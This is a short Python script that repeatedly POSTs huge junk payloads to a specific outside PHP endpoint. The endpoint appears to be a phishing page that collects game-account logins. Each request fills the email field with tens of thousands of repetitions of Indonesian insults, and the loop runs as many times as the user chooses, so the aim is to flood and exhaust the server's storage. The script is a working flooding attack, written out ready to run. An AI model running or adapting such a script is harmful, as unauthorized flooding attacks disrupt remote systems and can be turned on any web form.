
import requests

url = 'https://jnnsjy1.ggkyyr1.biz.id/data.php'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
}

loop_value = int(input("bar bar brp kali? : "))

for i in range(1, loop_value+1):
    email = '|TOLOLLLL BEGO'*200 + str(i) + '''|GW TUTORIN DEK?|
    DOUBLE DATA WKWKWKWK|
    ADUH LAG KAPASITAS PENUH WKWKWKk@gmail.com
    |BY : -FRNDS🖕🖕🖕''' * 10000
    
    data = {
        'playid'    : '666666666',
        'nickname'  : 'TOLOL SEKALI KAU|',
        'level'     : '19',
        'tier'      : 'Mythic Glory',
        'elitepass' : 'Pernah',
        'email'     : email,
        'password'  : 'TOBAT WOYYYY DASAR TITIT GA GUNA|',
        'login'     : 'Facebook'
    }
    
    response = requests.post(url, data=data, headers=headers)
    print("bang udah bang", i)
